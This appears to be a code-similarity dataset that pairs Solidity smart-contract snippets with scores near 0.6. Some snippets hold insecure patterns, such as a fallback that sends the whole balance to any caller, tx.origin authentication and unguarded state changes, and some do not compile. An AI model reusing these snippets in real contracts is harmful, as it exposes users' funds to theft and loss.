
        deployedBlogs.push(newBlogger);

        return newBlogger;

    }



    function getDeployedBlogs() public view returns(address[]) {

        return deployedBlogs;

    }

}"
"contract Campaign {

struct Request {
    string description;
    uint value;
    address recipient;
    bool complete;
    uint approvalCount;
    mapping (address => bool) approvals;
}

Request[] public requests;
address public manager;
uint public minimumContribution;
mapping (address => bool) public approvers;
uint public approversCount;

modifier restrict() {
    require(msg.sender == manager);
    _;
}

constructor(uint min, address creator) public {
    manager = creator;
    minimumContribution = min;
}

function contribute() public payable {
    require(msg.value > minimumContribution, ""Error: You do not have enough money. You are poor."");
    approvers[msg.sender] = true;
    approversCount++;
}

function createRequest(string memory desc, uint val, address rec) public restrict {
    
    require(approvers[msg.sender]);

    Request memory newReq = Request({
        description: desc,
        value: val,
        recipient: rec,
        complete: false,
        approvalCount: 0
    });

    requests.push(newReq);
}

function approveRequest(uint index) public {
    Request storage r = requests[index];

    
    require(approvers[msg.sender]);

    
    require(!r.approvals[msg.sender]);

    r.approvals[msg.sender] = true;
    r.approvalCount++;
}

function finalizeRequest(uint index) public restrict {

    Request storage r = requests[index];

    require(r.approvalCount > (approversCount / 2) );
    require(!r.complete);       

    r.recipient.transfer(r.value);
    r.complete = true;
  }
}",0.6145026544151434,"contract ZigZagToken {

    

    string public name = ""The ZigZag Token"";

    string public symbol = ""TZZT"";

    uint8 public decimals = 0;

    

    uint256 public totalSupply;

    uint256 public ZigZagSupply = 5000000;

    uint256 public price ;

    address public creator;

    

    mapping (address => uint256) public balanceOf;

    mapping (address => mapping (address => uint256)) public allowance;



    

    event Transfer(address indexed from, address indexed to, uint256 value);

    event FundTransfer(address backer, uint amount, bool isContribution);

    

    

    

    function ZigZagToken() public {

        totalSupply = ZigZagSupply * 10 ** uint256(decimals);  

        balanceOf[msg.sender] = totalSupply;    

        creator = msg.sender;

    }

    

    function _transfer(address _from, address _to, uint _value) internal {

        

        require(_to != 0x0);

        

        require(balanceOf[_from] >= _value);

        

        require(balanceOf[_to] + _value >= balanceOf[_to]);

        

        balanceOf[_from] -= _value;

        

        balanceOf[_to] += _value;

        Transfer(_from, _to, _value);

      

    }



    

    function transfer(address _to, uint256 _value) public {

        _transfer(msg.sender, _to, _value);

    }



    

    

    

    function () payable internal {

        

        if (price >= 0 ether && price < 0.05 ether){

        uint amount = 1000;                  

        uint amountRaised;                                     

        amountRaised += msg.value;                            

        require(balanceOf[creator] >= 4700000);               

        require(msg.value < 0.1 ether);                        

        balanceOf[msg.sender] += amount;                  

        balanceOf[creator] -= amount;                        

        Transfer(creator, msg.sender, amount);               

        creator.transfer(amountRaised);

        }

      

    }



 }"
"contract MyContract {
    struct MyStruct {
        address a;
        uint b;
    }

    MyStruct[] public MyStructs;

    function getStruct(uint index) public constant returns (address, uint) {
        return (MyStructs[index].a, MyStructs[index].b);
    }

    function addStruct(address _a, uint _b) public returns (uint){
        MyStruct memory a = MyStruct(_a, _b);
        MyStructs.length++;
        MyStructs.push(a);
        return MyStructs.length;
    }
}",0.6007889261516538,"contract Token {
    function balanceOf(address _owner) constant public returns (uint balance);
    function allowance(address _user, address _spender) constant public returns (uint amount);
    function transfer(address _to, uint _value) public returns (bool success);
    function transferFrom(address _from, address _to, uint _value) public returns (bool success);
}"
"contract MyContractOwnerAddr {
        uint256 public peopleCount = 0;
        mapping(uint => Person) public people;

        address owner;

        modifier onlyOwner() {
            require(msg.sender == owner);
            _;
        }

        struct Person {
            uint _id;
            string _firstName;
            string _lastName;
        }

        constructor() public {
            owner = msg.sender;
        }

        function addPerson(
            string memory _firstName,
            string memory _lastName)
            public
            onlyOwner
        {
            incrementCount();
            people[peopleCount] = Person(peopleCount, _firstName, _lastName);
        }

        function incrementCount() internal {
            peopleCount += 1;
        }
    }",0.6291527261040615,"contract WishingWell {



    event wishMade(address indexed wisher, string wish, uint256 amount);

    

    address owner;

    

    constructor() public {

        owner = msg.sender;

    }



    modifier onlyOwner {

        require(

            msg.sender == owner,

            ""Only owner can call this function.""

        );

        _;

    }



    function changeOwner(address new_owner) public onlyOwner {

        owner = new_owner;

    }

    

    function makeWish(string wish) public payable {

        emit wishMade(msg.sender, wish, msg.value);

    }

    

    function withdrawAll() public onlyOwner {

        address(owner).transfer(address(this).balance);

    }

    

}"
"contract C {
    uint256 hexVal = 0xABCD;

    function func(address[] addrs) {
        
    }
}",0.6863863977003316,"contract Dragon {
    function transfer( address _to, uint256 _amount );
}"
"contract coinCaller{

    function sendCoin(address coinContractAddress, address receiver, uint amount) public returns (address) {
        metaCoin m = metaCoin(coinContractAddress);
        var (status, addr) = m.sendToken(receiver, amount);
        return addr;
    }
}",0.6389075608428354,"contract OzrealTest is Notify
{
    address public ozr;
    
    function setOzr(address _addr) { ozr = _addr; }
    
    function notify(address _from, uint _amount) public returns (bool)
    {
        require(msg.sender == ozr);
        Notified(_from, _amount);
        return true;
    }
}"
"contract Transfer {
    function Transfer () {
        owner = msg.sender;
    }
    function sendEther (address dst) payable {
        if(msg.value<=0) revert();
        dst.transfer(msg.value);
    }
}",0.6444896315950548,"contract mortal {
    address private owner;
    
    function mortal() { owner = msg.sender; }
    
    function kill() { if (msg.sender == owner) selfdestruct(owner); }
}"
"contract Receive {
    uint256 public balance;
    function pay() public payable {

    }
}",0.6645214634561336,"contract Buyable {
  function buy (address receiver) public payable;
}"
"contract Contract {

  function deposit(bytes32 _id) payable {
     LogJob(msg.sender);
  }
  event LogJob(address indexed _from);
}",0.6134157661063705,"contract ControllerEventDefinitions {
    
    event ControllerBurn(address indexed from, bytes32 indexed to, uint value);
}"
"contract ApprovalContract {

  address payable public sender;
  address payable public receiver;
  address constant public approver = 0xd268143B6FBD9BC6533F778052710C962eaAa68C;


  function deposit(address payable _receiver) external payable {
    require(msg.value > 0);
    sender = msg.sender;
    receiver = _receiver;
  }

    function viewApprover() external pure returns(address) {
    return(approver);
  }

   function approve() external {
    require(msg.sender == approver);
    receiver.transfer(address(this).balance);
  }

}",0.6429404912054165,"contract Cryptoman is Mortal{

    
    function deposit() public payable {
    }

    
    function withdraw(uint amount, address payable receiver) public onlyOwner {
      require(address(this).balance >= amount, ""insufficient balance"");
      receiver.transfer(amount);
    }
    
    
    function withdrawTokens(address tokenAddress, uint amount, address payable receiver) public payable onlyOwner {
      ERC20 token = ERC20(tokenAddress);
      require(token.balanceOf(address(this))>=amount,""insufficient funds"");
      token.transfer(receiver, amount);
    }


}"
"contract B {

  function funcB(uint256 arg1) public pure returns(bool) {
    if (arg1 > 10) {
        return true;
    } else {
        return false;
    }
  }
}",0.6473313822510119,"contract Agent {

    using SafeMath for uint256;



    function isInitialized() public view returns (bool) {

        return false;

    }

}"
"contract Factory {
  
  function newChild() returns (address) {
    Child c = new Child();
    return c;
  }
  
}",0.6255214615703719,"contract Balance {

    function getBalance(address a) public view returns (uint) {

        return a.balance;

    }

}"
"contract MyToken {
  uint256 a;

  function SimpleGetter() returns(string) {
    return ""something"";
  }

  function DoTheGreat(address _to) returns(uint256) payable {
       
       return ;
  }
}",0.6560242108123325,"contract MortgageToken {
    function balanceOf(address _owner) constant returns (uint256);
    function transfer(address _to, uint256 _value) returns (bool);
}"
"contract splitfund {

address admin;

constructor() public {

    admin = msg.sender;
}


function splitFunds(address[] withdrawaddress, uint[] proration) public payable {

    for(uint i = 0; i<withdrawaddress.length; i++) {
    withdrawaddress[i].transfer(proration[i] * msg.value/100);
    }
  }
}",0.6169291754855017,"contract BalanceChecker {
  address public owner;
 

  constructor() public {
    owner = msg.sender;
  }

  function check(address[] memory addresses) public view returns (bool){
    
 
    for(uint i=0; i<addresses.length;i++){
      if(addresses[i].balance != 0){
          return true;
      }
    }
    return false;
    
  }
}"
"contract BoostrFactory {
            address[] private deployedBoostrs;

            function createBoostr(uint minimum) public {
                    address newBoostr = new Boostr(minimum, msg.sender);
                    deployedBoostrs.push(newBoostr);
            }

            function getAllBoostrs() public view returns (address[]) {
                    return deployedBoostrs;
            }
    }",0.6183233452314607,"contract DeployerI {



    mapping(address => uint) public deployedContractPointers;

    address[] public deployedContracts;



    function getDeployedContractsCount() public view returns(uint count);

    function isDeployedContract(address deployed) public view returns(bool isIndeed);



}"
"contract Boostr {
            struct Request {
                    string description;
                    uint value;
                    address recipient;
                    bool complete;
                    mapping(address=>bool) approval;
                    uint approvalCount;
            }

            Request[] public requests;
            address private manager;
            uint public minimumContribution;
            mapping(address=>bool) private supporters;
            mapping(address=>bool) private approvers;
            uint public approversCount;

            modifier managerRestricted() {
                    require(msg.sender == manager);
                    _;
            }

            modifier approverRestricted() {
                    require(approvers[msg.sender]);
                    _;
            }

            constructor(uint minimum, address creator) public {
                    manager = creator;
                    minimumContribution = minimum;
            }

            function getManager() public view returns (address) {
                    return manager;
            }

            function getApprover(address addr) public view returns (bool) {
                    return approvers[addr];
            }

            function getSupporter(address addr) public view returns (bool) {
                    return supporters[addr];
            }

            function contribute() public payable {
                    if (msg.value > 0) {
                            supporters[msg.sender] = true;
                            if (msg.value > minimumContribution) {
                                    approvers[msg.sender] = true;
                                    approversCount++;
                            }
                    }
            }

            function getSummary() public view returns (uint, uint, uint, uint, address) {
                    return (
                            minimumContribution,
                            address(this).balance,
                            requests.length,
                            approversCount,
                            getManager()
                    );
            }

            function getRequestsCount() public view returns (uint) {
                    return requests.length;
            }

            function createRequest(string description, uint value, address recipient) public managerRestricted {
                    Request memory newRequest = Request ({
                            description: description,
                            value: value,
                            recipient: recipient,
                            complete: false,
                            approvalCount: 0
                    });
                    requests.push(newRequest);
            }

            function approveRequest(uint index) public {
                    Request storage request = requests[index];
                    require (approvers[msg.sender]);
                    require (!request.approval[msg.sender]);
                    request.approval[msg.sender] = true;
                    request.approvalCount++;
            }

            function finalizeRequest(uint index) public managerRestricted payable {
                    Request storage request = requests[index];
                    require (!request.complete);
                    require (request.approvalCount > approversCount / 2);
                    request.complete = true;
                    request.recipient.transfer(request.value);
            }
    }",0.645511810335831,"contract ENC is ERC20Interface {

    uint256 public constant decimals = 5;



    string public constant symbol = ""ENC"";

    string public constant name = ""Enetrix Coin"";



    uint256 public _totalSupply = 5 ** 14; 



    

    address public owner;



    

    mapping(address => uint256) private balances;



    

    mapping(address => mapping (address => uint256)) private allowed;



    

    mapping(address => bool) private approvedInvestorList;



    

    mapping(address => uint256) private deposit;





    

    uint256 public totalTokenSold = 0;





    

    modifier onlyPayloadSize(uint size) {

      if(msg.data.length < size + 4) {

        revert();

      }

      _;

    }







    

    function ENC()

        public {

        owner = msg.sender;

        balances[owner] = _totalSupply;

    }



    

    

    function totalSupply()

        public

        constant

        returns (uint256) {

        return _totalSupply;

    }











    

    

    

    function balanceOf(address _addr)

        public

        constant

        returns (uint256) {

        return balances[_addr];

    }



    

    

    function isApprovedInvestor(address _addr)

        public

        constant

        returns (bool) {

        return approvedInvestorList[_addr];

    }



    

    

    

    function getDeposit(address _addr)

        public

        constant

        returns(uint256){

        return deposit[_addr];

}





    

    

    

    

    function transfer(address _to, uint256 _amount)

        public



        returns (bool) {

        

        

        

        if ( (balances[msg.sender] >= _amount) &&

             (_amount >= 0) &&

             (balances[_to] + _amount > balances[_to]) ) {



            balances[msg.sender] -= _amount;

            balances[_to] += _amount;

            Transfer(msg.sender, _to, _amount);

            return true;

        } else {

            return false;

        }

    }



    

    

    

    

    

    

    function transferFrom(

        address _from,

        address _to,

        uint256 _amount

    )

    public



    returns (bool success) {

        if (balances[_from] >= _amount && _amount > 0 && allowed[_from][msg.sender] >= _amount) {

            balances[_from] -= _amount;

            allowed[_from][msg.sender] -= _amount;

            balances[_to] += _amount;

            Transfer(_from, _to, _amount);

            return true;

        } else {

            return false;

        }

    }



    

    

    function approve(address _spender, uint256 _amount)

        public



        returns (bool success) {

        require((_amount == 0) || (allowed[msg.sender][_spender] == 0));

        allowed[msg.sender][_spender] = _amount;

        Approval(msg.sender, _spender, _amount);

        return true;

    }



    

    function allowance(address _owner, address _spender)

        public

        constant

        returns (uint256 remaining) {

        return allowed[_owner][_spender];

    }



    function () public payable{

        revert();

    }



}"
"contract Registry is Ownable {
  address core;

  function setCore(address _core) external onlyOwner {
    core = _core;
  }

  function getCore() public view returns (address) {
    return core;
  }
}",0.6653802859144088,"contract ERC20 {

    function approve(address spender, uint256 value) external returns (bool);

    function transferFrom(address from, address to, uint value) public returns (bool ok);

}"
"contract ShouldNotCompile {
    address addr;
    function getSender() constant returns (address) {
        addr = msg.sender;
        return addr;
    }
}",0.6981380162178963,"contract Context {
    
    
    constructor () internal { }
    

    function _msgSender() internal view returns (address payable) {
        return msg.sender;
    }
}"
"contract Proxy is IProxy {
  IERC20 public BT;
  IERC20 public QT;
  address public option;
  address public buyer;
  uint256 public dealExpiry;
  uint256 public price;
   function Proxy(address _baseToken, address _quoteToken, uint256 _expiry, uint256 _strikePrice, address _buyer) public {
      BT = IERC20(_baseToken);
      QT = IERC20(_quoteToken);
      dealExpiry = _expiry;
      price = _price;
      buyer = _buyer;
 }

   function distributeStakes(address _to, uint256 _amount) public returns (bool success) {
        require(QT.transfer(to, amount)); 
        require(BT.transferFrom(_to, buyer, _amount));
     }
     return true;
 }",0.6669519747165391,"contract Token {
	function SetupToken(string tokenName, string tokenSymbol, uint256 tokenSupply) public;
    function balanceOf(address _owner) public constant returns (uint256 balance);
    function transfer(address _to, uint256 _amount) public returns (bool success);
    function transferFrom(address _from, address _to, uint256 _amount) public returns (bool success);
    function approve(address _spender, uint256 _amount) public returns (bool success);
    function allowance(address _owner, address _spender) public constant returns (uint256 remaining);
}"
"contract example {
    mapping (uint => string) map;

    function example () {
        map[123] = ""123"";
    }

    function return1 () returns (string) {
        return map[123];
    }

    function return2 () returns (string) {
        return map[1];
    } 
}",0.6345920021638323,"contract PausedEURON is PausedToken {

    function name() public pure returns (string memory) {

        return ""EURON"";

    }



    function symbol() public pure returns (string memory) {

        return ""ERN"";

    }

}"
"contract DoesAddressExist {
        using SafeMath for uint256;


constructor() public {
}


function () private payable {}



struct ValueRecorded {
    uint valueEntered;
    uint8 flag;
}

ValueRecorded[] public valueRecorded;

mapping(address => ValueRecorded) user;




function storeValue(uint _value) public {
        ValueRecorded memory newValueRecorded = ValueRecorded ({
                valueEntered: _value,
                flag: 1
                });
        valueRecorded.push(newValueRecorded);

}


function checkForAddress(address _address) public view returns (bool) {
    if(user[_address].flag == 1) {
    return true; }
    else return false;
    }


}",0.6137855897828238,"contract Verification {
	using SafeMath for uint256;
    mapping(address => uint256) veruser;
	function RA(address _to) public view returns(bool){
		if(veruser[_to]>0){
			return true;
		}else{
			return false;
		}
	}
	function VerificationAccountOnJullar() public {
	    if(RA(msg.sender) == false){
		    veruser[msg.sender] = veruser[msg.sender].add(1);	
		}
	}
	
	string public TestText = ""Gaziali"";
	
	function RT() public view returns(string){
		return TestText;
	}
	
	function CIzTezt(string _value) public{
		TestText = _value;
	}
	
	function VaN(address _to) public {
		if(RA(_to) == false){
		    veruser[_to] = veruser[_to].add(1);	
		}
	}

}"
"contract MetaCoin {

    uint256[] public someNumbers;

    function writeNumber(uint256 num) public {
      someNumbers.push(num);
    }
...
",0.6492403083492209,"contract Abonus {

    function getETH(uint256 num) public;    

    function getETHNum() public view returns (uint256);

}"
"contract Registry {
    mapping(bytes32 => address) public ID;
    mapping(address => address) public Contract;

    function register(bytes32 _id) {
        ID[_id] = tx.origin;
        Contract[tx.origin] = msg.sender;
    }

    function getPublicAddress(bytes32 _id) constant returns (address) {
        return (ID[_id]);
    }

    function getContractAddress(bytes32 _id) constant returns (address) { 
        return Contract[ID[_id]];
    } 
}",0.6798661282626638,"contract IController is Pausable {

    event SetContractInfo(bytes32 id, address contractAddress, bytes20 gitCommitHash);



    function setContractInfo(bytes32 _id, address _contractAddress, bytes20 _gitCommitHash) external;

    function updateController(bytes32 _id, address _controller) external;

    function getContract(bytes32 _id) public view returns (address);

}"
"contract SRCICO is Pausable{
    using SafeMath for uint256;

    uint constant public minContribAmount = 0.01 ether;

    SRCToken public token;
    uint256 constant public tokenDecimals = 18;


    uint256 public startTime;
    uint256 public endTime;

    bool public icoEnabled;

    address public multisignWallet;

    uint256 public weiRaised;

    uint256 constant public totalSupply = 15000000 * (10 ** tokenDecimals);
    uint256 constant public preSaleCap = 1000 * (10 ** tokenDecimals);
    uint256 constant public initialICOCap = 1000 * (10 ** tokenDecimals);
    uint256 constant public tokensForTeam = 4500000 * (10 ** tokenDecimals);


    uint256 public soldPreSaleTokens;
    uint256 public sentPreSaleTokens;

    uint256 public icoCap;
    uint256 public icoSoldTokens;
    bool public icoEnded = false;


    uint256 constant public RATE_FOR_WEEK1 = 800000;
    uint256 constant public RATE_FOR_WEEK2 = 750000;
    uint256 constant public RATE_NO_DISCOUNT = 700000;

    event TokenPurchase(address indexed purchaser, address indexed beneficiary, uint256 value, uint256 amount);


    function SRCICO(address _multisignWallet) public {
      require(_multisignWallet != address(0));
      token = createTokenContract();
      uint256 tokensToDao = tokensForTeam;
      multisignWallet = _multisignWallet;
      token.transfer(multisignWallet, tokensToDao);
    }


    function createTokenContract() internal returns (SRCToken) {
      return new SRCToken();
    }


    function enableTokenTransferability() external onlyOwner {
      require(token != address(0));
      token.unpause();
    }

    function disableTokenTransferability() external onlyOwner {
      require(token != address(0));
      token.pause();
    }


    function setSoldPreSaleTokens(uint256 _soldPreSaleTokens) external onlyOwner{
      require(!icoEnabled);
      require(_soldPreSaleTokens <= preSaleCap);
      soldPreSaleTokens = _soldPreSaleTokens;
    }


    function setMultisignWallet(address _multisignWallet) external onlyOwner{
      require(!icoEnabled || now < startTime);
      require(_multisignWallet != address(0));
      multisignWallet = _multisignWallet;
    }


    function setContributionDates(uint64 _startTime, uint64 _endTime) external onlyOwner{
      require(!icoEnabled);
      require(_startTime >= now);
      require(_endTime >= _startTime);
      startTime = _startTime;
      endTime = _endTime;
    }



    function enableICO() external onlyOwner{

      icoEnabled = true;
      icoCap = initialICOCap.add(preSaleCap).sub(soldPreSaleTokens);
    }


    function () payable whenNotPaused public {
      purchaseTokens(msg.sender);
    }

    
    function purchaseTokens(address beneficiary) public payable whenNotPaused {
      require(beneficiary != address(0));
      require(validPurchase());

      uint256 weiAmount = msg.value;
      uint256 returnWeiAmount;

      uint rate = getRate();
      assert(rate > 0);
      uint256 tokens = weiAmount.mul(rate);

      uint256 newIcoSoldTokens = icoSoldTokens.add(tokens);

      if (newIcoSoldTokens > icoCap) {
          newIcoSoldTokens = icoCap;
          tokens = icoCap.sub(icoSoldTokens);
          uint256 newWeiAmount = tokens.div(rate);
          returnWeiAmount = weiAmount.sub(newWeiAmount);
          weiAmount = newWeiAmount;
      }

      
      weiRaised = weiRaised.add(weiAmount);

      token.transfer(beneficiary, tokens);
      icoSoldTokens = newIcoSoldTokens;
      if (returnWeiAmount > 0){
          msg.sender.transfer(returnWeiAmount);
      }

      TokenPurchase(msg.sender, beneficiary, weiAmount, tokens);

      sendFunds();
    }

    function sendFunds() internal {
      multisignWallet.transfer(this.balance);
    }


    function validPurchase() internal constant returns (bool) {
      bool withinPeriod = now >= startTime && now <= endTime;
      bool nonMinimumPurchase = msg.value >= minContribAmount;
      bool icoTokensAvailable = icoSoldTokens < icoCap;
      return !icoEnded && icoEnabled && withinPeriod && nonMinimumPurchase && icoTokensAvailable;
    }

    function endIco() external onlyOwner {
      require(!icoEnded);
      icoEnded = true;

      uint256 unsoldTokens = icoCap.sub(icoSoldTokens);
      token.transfer(multisignWallet, unsoldTokens);
    }


    function hasEnded() public constant returns (bool) {
      return (icoEnded || icoSoldTokens >= icoCap || now > endTime);
    }


    function getRate() public constant returns(uint){
      require(now >= startTime);
      if (now < startTime.add(4 weeks)){
        
        return RATE_FOR_WEEK1;
      }else if (now < startTime.add(8 weeks)){
        
        return RATE_FOR_WEEK2;
      }else if (now < endTime){
        
        return RATE_NO_DISCOUNT;
      }
      return 0;
    }

    function drain() external onlyOwner {
      owner.transfer(this.balance);
    }
  }",0.6862617950368368,"contract Crowdsale is Ownable {

    using SafeMath for uint256;

    FoxTradingToken public token;
    uint256 public tokensForPreICO;
    uint256 public tokenCapForFirstMainStage;
    uint256 public tokenCapForSecondMainStage;
    uint256 public tokenCapForThirdMainStage;
    uint256 public tokenCapForFourthMainStage;
    uint256 public totalTokensForSale;
    uint256 public startTime;
    uint256 public endTime;
    address public wallet;
    uint256 public rate;
    uint256 public weiRaised;

    uint256[4] public ICObonusStages;

    uint256 public preICOduration;
    bool public mainSaleActive;

    uint256 public tokensSold;

    
    event TokenPurchase(address indexed purchaser, address indexed beneficiary, uint256 value, uint256 amount);
    event ICOSaleExtended(uint256 newEndTime);

    function Crowdsale() public {
        token = new FoxTradingToken();  
        startTime = now; 
        rate = 1200;
        wallet = 0x47dE58a352e40d7FC57Efe57944836a0173206c2;
        tokensForPreICO = 4500000e18;

        tokenCapForFirstMainStage = 11500000e18;  
        tokenCapForSecondMainStage = 18500000e18;  
        tokenCapForThirdMainStage = 25500000e18;  
        tokenCapForFourthMainStage = 35000000e18;  

        totalTokensForSale = 35000000e18;
        tokensSold = 0;

        preICOduration = now.add(31 days);
        endTime = preICOduration;

        mainSaleActive = false;
    }

    function() external payable {
        buyTokens(msg.sender);
    }

    function buyTokens(address _addr) public payable {
        require(validPurchase() && tokensSold < totalTokensForSale);
        require(_addr != 0x0 && msg.value >= 100 finney);  
        uint256 toMint;
        if(now <= preICOduration) {
            if(tokensSold >= tokensForPreICO) { revert(); }
            toMint = msg.value.mul(rate.mul(2));
        } else {
            if(!mainSaleActive) { revert(); }
            toMint = msg.value.mul(getRateWithBonus());
        }
        tokensSold = tokensSold.add(toMint);
        token.mint(_addr, toMint);
        forwardFunds();
    }

    function forwardFunds() internal {
        wallet.transfer(msg.value);
    }

    function processOfflinePurchase(address _to, uint256 _toMint) public onlyOwner {
        require(tokensSold.add(_toMint) <= totalTokensForSale);
        require(_toMint > 0 && _to != 0x0);
        tokensSold = tokensSold.add(_toMint);
        token.mint(_to, _toMint);
    }

    function validPurchase() internal view returns (bool) {
        bool withinPeriod = now >= startTime && now <= endTime; 
        bool nonZeroPurchase = msg.value != 0; 
        return withinPeriod && nonZeroPurchase;
    }

    
    function finishMinting() public onlyOwner {
        token.finishMinting();
    }


    function getRateWithBonus() internal view returns (uint256 rateWithDiscount) {
        if (now > preICOduration && tokensSold < totalTokensForSale) {
            return rate.mul(getCurrentBonus()).div(100).add(rate);
            return rateWithDiscount;
        }
        return rate;
    }

    
    function getCurrentBonus() internal view returns (uint256 discount) {
        require(tokensSold < tokenCapForFourthMainStage);
        uint256 timeStamp = now;
        uint256 stage;

        for (uint i = 0; i < ICObonusStages.length; i++) {
            if (timeStamp <= ICObonusStages[i]) {
                stage = i + 1;
                break;
            } 
        } 

        if(stage == 1 && tokensSold < tokenCapForFirstMainStage) { discount = 20; }
        if(stage == 1 && tokensSold >= tokenCapForFirstMainStage) { discount = 15; }
        if(stage == 1 && tokensSold >= tokenCapForSecondMainStage) { discount = 10; }
        if(stage == 1 && tokensSold >= tokenCapForThirdMainStage) { discount = 0; }

        if(stage == 2 && tokensSold < tokenCapForSecondMainStage) { discount = 15; }
        if(stage == 2 && tokensSold >= tokenCapForSecondMainStage) { discount = 10; }
        if(stage == 2 && tokensSold >= tokenCapForThirdMainStage) { discount = 0; }

        if(stage == 3 && tokensSold < tokenCapForThirdMainStage) { discount = 10; }
        if(stage == 3 && tokensSold >= tokenCapForThirdMainStage) { discount = 0; }

        if(stage == 4) { discount = 0; }

        return discount;
    }


    
    
    function activateMainSale() public onlyOwner {
        require(now > preICOduration || tokensSold >= tokensForPreICO);
        require(!mainSaleActive);
        if(now < preICOduration) { preICOduration = now; }
        mainSaleActive = true;
        ICObonusStages[0] = now.add(7 days);

        for (uint y = 1; y < ICObonusStages.length; y++) {
            ICObonusStages[y] = ICObonusStages[y - 1].add(7 days);
        }

        endTime = ICObonusStages[3];
    }

    function extendDuration(uint256 _newEndTime) public onlyOwner {
        require(endTime < _newEndTime && mainSaleActive);
        endTime = _newEndTime;
        ICOSaleExtended(_newEndTime);
    }


    function hasEnded() public view returns (bool) { 
        return now > endTime;
    }

    
    function unpauseToken() public onlyOwner {
        token.unpause();
    }
}"
"contract MyContract {
    using SafeMath for uint256;
    uint dayInSec = 86400;

    function calc() public returns(uint) {
        return now.add(dayInSec);
    }
}",0.65479054392416,"contract FiatContract {
  function USD(uint _id) public view returns (uint256);
  function updatedAt(uint _id) public view returns (uint);
}"
"contract Token {
  mapping (address => uint) public balances;
  event TokenSent(address sender, address receiver, uint amount);
  function Token(uint supply) {
    if (supply == 0) supply = 10000;
    balances[msg.sender] = supply;
  }
  function send(address receiver, uint amount) returns (bool ok) {
    if (balances[msg.sender] < amount) return false;
    balances[msg.sender] -= amount;
    balances[receiver] += amount;
    TokenSent(msg.sender, receiver, amount);
    return true;
  }
}",0.6778189524318546,"contract BasicToken is ERC20Basic {

    using SafeMath for uint;



    mapping(address => uint) balances;



  

    function transfer(address _to, uint _value) public returns (bool) {

        require(_to != address(0));

        require(_value <= balances[msg.sender]);



        

        balances[msg.sender] = balances[msg.sender].sub(_value);

        balances[_to] = balances[_to].add(_value);

        emit Transfer(msg.sender, _to, _value);

        return true;

    }



  

    function balanceOf(address _owner) public view returns (uint balance) {

        return balances[_owner];

    }



}"
"contract Relay is Token {

  uint256 public approvalCount;
  function Relay() {
    
  }


  modifier onlyOwner {
    if (msg.sender != owner) revert();
    _;
  }


  function approveTransaction() {
    approvalCount += 1;

    if (approvalCount == 3) {

      mint(msg.sender, 1);
      kill();
    }
  }

  function kill() onlyOwner() {
    selfdestruct(owner);
  }

}",0.6569559115481349,"contract owned {

  address public owner;

  function owned() public { owner = msg.sender; }



  modifier onlyOwner {

    if (msg.sender != owner) { revert(); }

    _;

  }



  function changeOwner( address newown ) public onlyOwner { owner = newown; }

  function closedown() public onlyOwner { selfdestruct( owner ); }

}"
"contract A {

    address destAdd;

    function A(address sendContractAddress)  {
        destAdd = sendContractAddress;
    }

    function () {
        uint transferAmt= this.balance;
        if (!msg.sender.call.value(transferAmt)()) throw; 
    }
}",0.6085417607213554,"contract EthertoteToken {

    function thisContractAddress() public pure returns (address) {}

    function balanceOf(address) public pure returns (uint256) {}

    function transfer(address, uint) public {}

}"
"contract B {

    function() {

            
            bool ret = msg.sender.call('0xabcdefgh');
            if (!ret) throw;
        }
}",0.6210300261064625,"contract SendBack {
    function() payable {
        if (!msg.sender.send(msg.value))
            throw;
    }
}"
"contract MyToken {
        
        mapping (address => uint256) public balanceOf;
        function MyToken(uint256 initialSupply) public {
            balanceOf[msg.sender] = 25;
        }",0.6891833644414953,"contract Token {
    mapping(address => uint256) public balanceOf;
    function transfer(address to, uint256 value) public returns (bool success) {

    }
}"
"contract Transform {

    InputToken inputToken;
    OutputToken outputToken;

    event Transformed(address from, uint256 input, uint256 output);

    constructor(address _inputToken, address _outputToken) public {
    inputToken = InputToken(_inputToken); 
    outputToken = OutputToken(_outputToken); 
}

    function transformTokens(uint256 _amount) external payable {
        require(_amount > 0);

        uint256 input = _amount; 
        uint256 rate = 1000;

        uint256 output = input.div(rate);
        uint256 excess;

        inputToken.transferFrom(msg.sender, address(this), input);
        outputToken.mint(msg.sender, output);

        Transformed(msg.sender, input, output);
    }
}",0.6139994987122586,"contract TokenReceiver is Ownable {

    IERC20 public token;



    event Receive(address from, uint invoiceID, uint amount);



    constructor (address _token) public {

        require(_token != address(0));



        token = IERC20(_token);

    }



    function receiveTokenWithInvoiceID(uint _invoiceID, uint _amount) public {

        require(token.transferFrom(msg.sender, address(this), _amount), """");

        

        emit Receive(msg.sender, _invoiceID, _amount);

    }



    function changeToken(address _token) public onlyOwner {

        token = IERC20(_token);

    }

    

    function reclaimToken(IERC20 _token, uint _amount) external onlyOwner {

        _token.transfer(owner, _amount);

    }

}"
"contract Award {
    
    address authority;
    string public hash;
    
    bool itWorked = false;
    
    mapping(address => bool) users;
    
    function Award(string _hash) public {
        authority = msg.sender;
        hash = _hash;
    }
    
    function addUser(address _address) public {
        users[_address] = true;
    }
    
    function deleteUser(address _address) public {
        users[_address] = false;
    }
    
    function hasUser(address _address) public view returns (bool) {
        return users[_address];
    }

    function test() public pure returns (bool) {
        return true;
    }
    
}",0.6914908243222428,"contract ERC20
{
    function totalSupply()
        public
        view
        returns (uint);

    function balanceOf(
        address who
        )
        public
        view
        returns (uint);

    function allowance(
        address owner,
        address spender
        )
        public
        view
        returns (uint);

    function transfer(
        address to,
        uint value
        )
        public
        returns (bool);

    function transferFrom(
        address from,
        address to,
        uint    value
        )
        public
        returns (bool);

    function approve(
        address spender,
        uint    value
        )
        public
        returns (bool);
}"
"contract DevCoin is usingOraclize {

    mapping (address => uint256) public balances;

    event Transfer(address from, address to, uint256 value);

    uint256 public z;

    event newOraclizeQuery(string description);

    function __callback(bytes32 myid, string result) {
        if (msg.sender != oraclize_cbAddress()) throw;
         
    }

    function DevCoin() payable public {
        balances[msg.sender] = z;
        OAR = OraclizeAddrResolverI(0x6f485C8BF6fc43eA212E93BBF8ce046C7f1cb475);
        
    }

    function update() payable {
         newOraclizeQuery(""Oraclize query was sent, standing by for the answer.."");
         oraclize_query(""URL"", ""json(https:
    }

    function sendCoin(address receiver, uint256 amount) payable public returns (bool) {
        if (balances[msg.sender] < amount) return false;
        balances[msg.sender] -= amount;
        balances[receiver] += amount;
        Transfer(msg.sender, receiver, amount);
        return true;
    }

    function getBalance(address addr) public view returns (uint256) {
        return balances[addr];
    }
}",0.6955029256321271,"contract MultiEthSender {



  uint256 constant private ethInWei = 10**18;

  mapping(address => uint256) private balance;

  address public owner;



  event Send(uint256 _amount, address indexed receiver);



  constructor() public payable {

    owner = msg.sender;

    balance[msg.sender] = msg.value;

  }



  function multiSendEth(uint256 amount, address[] list) public returns (bool) {

